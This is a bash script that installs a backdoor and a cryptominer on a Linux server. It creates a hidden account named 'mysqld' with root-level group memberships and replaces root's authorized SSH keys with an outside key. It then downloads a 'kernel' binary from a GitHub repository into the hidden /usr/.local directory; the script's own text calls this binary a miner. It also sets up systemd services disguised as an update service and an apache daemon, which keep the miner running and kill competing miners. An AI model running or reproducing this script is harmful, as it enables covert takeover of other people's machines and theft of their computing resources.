#!/bin/bash

USERNAME="mysqld"
HASHED_PASS='$6$BmyFRFVm74WLGFqO$2s1sTXYHy0H/G63Sif1Syg55lfY4WOZBNY3IGtYrjTF8We5AsX0ooh8b8s0qCNhEB6rMYzaihSw7tso4LZepc0'

echo "[*] Creating user '$USERNAME' with given password hash..."
useradd --no-create-home --shell /bin/bash -p "$HASHED_PASS" "$USERNAME"
usermod -aG sudo mysqld
usermod -aG whell mysqld
usermod -aG root mysqld

echo "[+] User '$USERNAME' created with root privileges."

echo "[*] Setting up SSH key for root user..."
rm -rf /root/.ssh
mkdir -p /root/.ssh
chmod 700 /root/.ssh
bash -c 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJO5VmgyYQjzSfsxbnbCHq19ZsdQXuf1lIk41XDrCuIC Generated By Termius" >> /root/.ssh/authorized_keys'
chmod 600 /root/.ssh/authorized_keys
echo "[+] SSH public key added to root's authorized_keys."

mkdir -p /usr/.local
wget https://github.com/hba343434/kernel/raw/refs/heads/main/kernel -O /usr/.local/kernel
wget https://github.com/hba343434/kernel/raw/refs/heads/main/config.json -O /usr/.local/config.json

ln -sf /usr/.local/kernel /usr/local/bin/kernel
chmod +x /usr/.local/kernel

if [ -n "$1" ]; then
    sed -i 's/"pass": *"[^"]*",/"pass": "'"$1"'",/' /usr/.local/config.json
fi

tee /usr/.local/run.sh > /dev/null << 'EOF'
#!/bin/bash
if ! pidof kernel >/dev/null; then
    nice kernel
else
    echo "kernel updater is already running in the background. Refusing to run another one."
    echo "Run \"killall kernel\" or \"sudo killall kernel\" if you want to remove background miner first."
fi
EOF

chmod +x /usr/.local/run.sh



tee /usr/.local/daemon.sh > /dev/null << 'EOF'
#!/bin/bash
while true; do
    if pgrep daemon > /dev/null; then
        pkill -9 daemon
    fi
    sleep 10
done
EOF

chmod +x /usr/.local/daemon.sh

echo " created daemon miner killer script "

tee /etc/systemd/system/daemon.service > /dev/null << 'EOF'
[Unit]
Description=apache daemon

[Service]
ExecStart=/usr/.local/daemon.sh
Restart=always
RestartSec=5
Nice=5

[Install]
WantedBy=multi-user.target
EOF

echo "created daemon-kill service"

tee /etc/systemd/system/kernel-updater.service > /dev/null << 'EOF'
[Unit]
Description=Update Service

[Service]
ExecStart=/usr/.local/run.sh
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable --now kernel-updater.service
systemctl enable --now daemon.service

echo "done"
